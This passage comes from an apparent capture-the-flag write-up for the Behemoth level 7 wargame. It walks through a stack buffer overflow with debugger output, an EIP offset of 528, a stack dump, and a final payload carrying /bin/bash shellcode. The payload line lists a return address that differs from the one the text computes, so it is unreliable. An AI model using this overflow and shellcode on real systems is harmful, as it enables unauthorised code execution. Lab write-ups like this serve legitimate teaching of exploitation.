&nbsp; &nbsp; &nbsp; <br> </span><span class="c4">EBX</span><span class="c8">&nbsp; </span><span class="c4">0x0</span><span class="c8">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br> </span><span class="c4">ECX</span><span class="c8">&nbsp; </span><span class="c4">0xffffd290</span><span class="c8">&nbsp;&#9666;-- </span><span class="c0">&#39;yaaj&#39;</span><span class="c8">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br> </span><span class="c4">EDX</span><span class="c8">&nbsp; </span><span class="c4">0xffffcde0</span><span class="c8">&nbsp;&#9666;-- </span><span class="c0">&#39;yaaj&#39;</span><span class="c8">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br> </span><span class="c4">EDI</span><span class="c8">&nbsp; </span><span class="c4">0xf7fa6000</span><span class="c8">&nbsp;(_GLOBAL_OFFSET_TABLE_) &#9666;-- </span><span class="c7">insb</span><span class="c8">&nbsp; &nbsp;</span><span class="c4">byte</span><span class="c8">&nbsp;</span><span class="c4">ptr</span><span class="c8">&nbsp;</span><span class="c4">es</span><span class="c8">:[</span><span class="c4">edi</span><span class="c8">], </span><span class="c4">dx</span><span class="c8">&nbsp;/* </span><span class="c4">0x1e4d6c</span><span class="c8">&nbsp;*/<br> </span><span class="c4">ESI</span><span class="c8">&nbsp; </span><span class="c4">0xf7fa6000</span><span class="c8">&nbsp;(_GLOBAL_OFFSET_TABLE_) &#9666;-- </span><span class="c7">insb</span><span class="c8">&nbsp; &nbsp;</span><span class="c4">byte</span><span class="c8">&nbsp;</span><span class="c4">ptr</span><span class="c8">&nbsp;</span><span class="c4">es</span><span class="c8">:[</span><span class="c4">edi</span><span class="c8">], </span><span class="c4">dx</span><span class="c8">&nbsp;/* </span><span class="c4">0x1e4d6c</span><span class="c8">&nbsp;*/<br> </span><span class="c4">EBP</span><span class="c8">&nbsp; </span><span class="c4">0x66616167</span><span class="c8">&nbsp;(</span><span class="c0">&#39;gaaf&#39;</span><span class="c8">) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br> </span><span class="c4">ESP</span><span class="c8">&nbsp; </span><span class="c4">0xffffcc10</span><span class="c8">&nbsp;&#9666;-- </span><span class="c4">0x66616169</span><span class="c8">&nbsp;(</span><span class="c0">&#39;iaaf&#39;</span><span class="c8">) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br> </span><span class="c4">EIP</span><span class="c8">&nbsp; </span><span class="c4">0x66616168</span><span class="c8">&nbsp;(</span><span class="c0">&#39;haaf&#39;</span><span class="c8">) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;[ DISASM ]&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>Invalid address </span><span class="c4">0x66616168</span><span class="c8">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br><br>pwndbg&gt; cyclic -l </span><span class="c4">0x66616168</span><span class="c8"><br></span><span class="c4">528</span></p></td></tr></table><p class="c9"><span class="c13"></span></p><p class="c12"><span class="c13">The offset was calculated as 528 bytes, and as such 528 bytes of junk must first be inputted into the binary before the EIP register can be controlled. </span></p><h4 class="c11" id="h.vmauwlddokdj"><span class="c44 c22">Shellcode Address</span></h4><p class="c12"><span>The next step is to determine the address of the shellcode</span><sup><a href="#ftnt13" id="ftnt_ref13">[13]</a></sup><span class="c13">. This can easily be analyzed within GDB:</span></p><a id="t.fc735e7ff381c83cef42074fec4660f27f98177a"></a><a id="t.65"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">(gdb) r $(python -c &quot;print &#39;A&#39;*528+&#39;BBBB&#39;+&#39;A&#39;*112+&#39;</span><span class="c0">\x</span><span class="c8">6a</span><span class="c0">\x</span><span class="c8">0b</span><span class="c0">\x</span><span class="c8">58</span><span class="c0">\x</span><span class="c8">99</span><span class="c0">\x</span><span class="c8">52</span><span class="c0">\x</span><span class="c8">66</span><span class="c0">\x</span><span class="c8">68</span><span class="c0">\x</span><span class="c8">2d</span><span class="c0">\x</span><span class="c8">70</span><span class="c0">\x</span><span class="c8">89</span><span class="c0">\x</span><span class="c8">e1</span><span class="c0">\x</span><span class="c8">52</span><span class="c0">\x</span><span class="c8">6a</span><span class="c0">\x</span><span class="c8">68</span><span class="c0">\x</span><span class="c8">68</span><span class="c0">\x</span><span class="c8">2f</span><span class="c0">\x</span><span class="c8">62</span><span class="c0">\x</span><span class="c8">61</span><span class="c0">\x</span><span class="c8">73</span><span class="c0">\x</span><span class="c8">68</span><span class="c0">\x</span><span class="c8">2f</span><span class="c0">\x</span><span class="c8">62</span><span class="c0">\x</span><span class="c8">69</span><span class="c0">\x</span><span class="c8">6e</span><span class="c0">\x</span><span class="c8">89</span><span class="c0">\x</span><span class="c8">e3</span><span class="c0">\x</span><span class="c8">52</span><span class="c0">\x</span><span class="c8">51</span><span class="c0">\x</span><span class="c8">53</span><span class="c0">\x</span><span class="c8">89</span><span class="c0">\x</span><span class="c8">e1</span><span class="c0">\x</span><span class="c8">cd</span><span class="c0">\x</span><span class="c8">80&#39;&quot;)<br><br>Starting program: /behemoth/behemoth7 $(python -c &quot;print &#39;A&#39;*528+&#39;BBBB&#39;+&#39;A&#39;*112+&#39;</span><span class="c0">\x</span><span class="c8">6a</span><span class="c0">\x</span><span class="c8">0b</span><span class="c0">\x</span><span class="c8">58</span><span class="c0">\x</span><span class="c8">99</span><span class="c0">\x</span><span class="c8">52</span><span class="c0">\x</span><span class="c8">66</span><span class="c0">\x</span><span class="c8">68</span><span class="c0">\x</span><span class="c8">2d</span><span class="c0">\x</span><span class="c8">70</span><span class="c0">\x</span><span class="c8">89</span><span class="c0">\x</span><span class="c8">e1</span><span class="c0">\x</span><span class="c8">52</span><span class="c0">\x</span><span class="c8">6a</span><span class="c0">\x</span><span class="c8">68</span><span class="c0">\x</span><span class="c8">68</span><span class="c0">\x</span><span class="c8">2f</span><span class="c0">\x</span><span class="c8">62</span><span class="c0">\x</span><span class="c8">61</span><span class="c0">\x</span><span class="c8">73</span><span class="c0">\x</span><span class="c8">68</span><span class="c0">\x</span><span class="c8">2f</span><span class="c0">\x</span><span class="c8">62</span><span class="c0">\x</span><span class="c8">69</span><span class="c0">\x</span><span class="c8">6e</span><span class="c0">\x</span><span class="c8">89</span><span class="c0">\x</span><span class="c8">e3</span><span class="c0">\x</span><span class="c8">52</span><span class="c0">\x</span><span class="c8">51</span><span class="c0">\x</span><span class="c8">53</span><span class="c0">\x</span><span class="c8">89</span><span class="c0">\x</span><span class="c8">e1</span><span class="c0">\x</span><span class="c8">cd</span><span class="c0">\x</span><span class="c8">80&#39;&quot;)<br><br>Program received signal SIGSEGV, Segmentation fault.<br>0x42424242 in ?? ()</span></p></td></tr></table><p class="c12"><span class="c32 c75">Note that the EIP register was successfully controlled to be 0x42424242 (equivalent to BBBB)</span></p><p class="c9"><span class="c13"></span></p><p class="c12"><span class="c13">The beginning of the shellcode can be found withhin the stack pointer:</span></p><a id="t.b6c8b2c6dac83bd585d850ebbdae663b4bc8ae37"></a><a id="t.66"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">(gdb) x/</span><span class="c4">100</span><span class="c8">x $esp-</span><span class="c4">200</span><span class="c8">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br></span><span class="c4">0</span><span class="c8">xffffd228: &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8"><br></span><span class="c4">0</span><span class="c8">xffffd238: &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br></span><span class="c4">0</span><span class="c8">xffffd248: &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br></span><span class="c4">0</span><span class="c8">xffffd258: &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br></span><span class="c4">0</span><span class="c8">xffffd268: &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br></span><span class="c4">0</span><span class="c8">xffffd278: &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br></span><span class="c4">0</span><span class="c8">xffffd288: &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8"><br></span><span class="c4">0</span><span class="c8">xffffd298: &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8"><br></span><span class="c4">0</span><span class="c8">xffffd2a8: &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8"><br></span><span class="c4">0</span><span class="c8">xffffd2b8: &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br></span><span class="c4">0</span><span class="c8">xffffd2c8: &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8"><br></span><span class="c4">0</span><span class="c8">xffffd2d8: &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8"><br></span><span class="c4">0</span><span class="c8">xffffd2e8: &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x42424242</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br></span><span class="c4">0</span><span class="c8">xffffd2f8: &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br></span><span class="c4">0</span><span class="c8">xffffd308: &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br></span><span class="c4">0</span><span class="c8">xffffd318: &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8"><br></span><span class="c4">0</span><span class="c8">xffffd328: &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8"><br></span><span class="c4">0</span><span class="c8">xffffd338: &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8"><br></span><span class="c4">0</span><span class="c8">xffffd348: &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br></span><span class="c4">0</span><span class="c8">xffffd358: &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0</span><span class="c8">x99580b6a &nbsp; &nbsp; &nbsp;</span><span class="c4">0</span><span class="c8">x</span><span class="c4">2d686652</span><span class="c8"><br></span><span class="c4">0</span><span class="c8">xffffd368: &nbsp; &nbsp; </span><span class="c4">0x52e18970</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0</span><span class="c8">x2f68686a &nbsp; &nbsp; &nbsp;</span><span class="c4">0x68736162</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0</span><span class="c8">x6e69622f<br></span><span class="c4">0</span><span class="c8">xffffd378: &nbsp; &nbsp; </span><span class="c4">0</span><span class="c8">x</span><span class="c4">5152e389</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0</span><span class="c8">xcde18953 &nbsp; &nbsp; &nbsp;</span><span class="c4">0x00000080</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0</span><span class="c8">xffffd4df<br></span><span class="c4">0</span><span class="c8">xffffd388: &nbsp; &nbsp; </span><span class="c4">0</span><span class="c8">xffffd4f3 &nbsp; &nbsp; &nbsp;</span><span class="c4">0x00000000</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0</span><span class="c8">xffffd799 &nbsp; &nbsp; &nbsp;</span><span class="c4">0</span><span class="c8">xffffd7ac<br></span><span class="c4">0</span><span class="c8">xffffd398: &nbsp; &nbsp; </span><span class="c4">0</span><span class="c8">xffffdd68 &nbsp; &nbsp; &nbsp;</span><span class="c4">0</span><span class="c8">xffffdd83 &nbsp; &nbsp; &nbsp;</span><span class="c4">0</span><span class="c8">xffffddb8 &nbsp; &nbsp; &nbsp;</span><span class="c4">0</span><span class="c8">xffffddcd<br></span><span class="c4">0</span><span class="c8">xffffd3a8: &nbsp; &nbsp; </span><span class="c4">0</span><span class="c8">xffffdde5 &nbsp; &nbsp; &nbsp;</span><span class="c4">0</span><span class="c8">xffffde01 &nbsp; &nbsp; &nbsp;</span><span class="c4">0</span><span class="c8">xffffde10 &nbsp; &nbsp; &nbsp;</span><span class="c4">0</span><span class="c8">xffffde21</span></p></td></tr></table><p class="c9"><span class="c13"></span></p><p class="c9"><span class="c13"></span></p><p class="c12"><span>The junk after the EIP begins at </span><span class="c4">0</span><span class="c8">xffffd2e8</span><span>&nbsp;+ 8 which is </span><span class="c4">0xffffd2f0</span><span>. Following the junk bytes is the shellcode at </span><span class="c4">0</span><span class="c8">xffffd358</span><span>&nbsp;+ 8 which is equivalent to </span><span class="c4">0xffffd</span><span class="c8">360</span><span>. Therefore the EIP value should be overwritten to point to f </span><span class="c4">0</span><span class="c8">xffffd360</span><span class="c13">.</span></p><h4 class="c11" id="h.gb02temjdnc4"><span class="c44 c22">Final Payload</span></h4><p class="c12"><span class="c13">With the knowledge of the EIP offset and the shellcode address, the final payload can now be constructed:</span></p><p class="c47 c36 c45"><span class="c15"></span></p><p class="c12"><span class="c15">&lsquo;A&rsquo;*528 + &lsquo;\x48\xd3\xff\xff&rsquo; + &lsquo;A&rsquo;*112 + &lsquo;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80&rsquo;</span></p><p class="c9"><span class="c13"></span></p><p class="c12"><span class="c13">It is important to note that the repetition of &lsquo;A&rsquo; 112 times was chosen so as to not spill 0x41 into the shellcode portion of memory. This value of 112 is not necessary, but it should be a multiple of 4 to prevent spilling into memory addresses that only shellcode should occupy.</span></p><p class="c9"><span class="c13"></span></p><p class="c12"><span>The payload works in GDB as can be seen from </span><span class="c29">/bin/bash</span><span>&nbsp;being executed</span><span class="c13">:</span></p><a id="t.c70fbf7a4c41543d384ed30510c71dbecf08bf1b"></a><a id="t.67"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">(gdb) r $(python -c &quot;print &#39;A&#39;*528+&#39;</span><span class="c0">\x</span><span class="c8">60</span><span class="c0">\x</span><span class="c8">d3</span><span class="c0">\x</span><span class="c8">ff</span><span class="c0">\x</span><span class="c8">ff&#39;+&#39;A&#39;*112+&#39;</span><span class="c0">\x</span><span class="c8">6a</span><span class="c0">\x</span><span class="c8">0b</span><span class="c0">\x</span><span class="c8">58</span><span class="c0">\x</span><span class="c8">99</span><span class="c0">\x</span><span class="c8">52</span><span class="c0">\x</span><span class="c8">66 &nbsp; &nbsp; &nbsp; &nbsp; 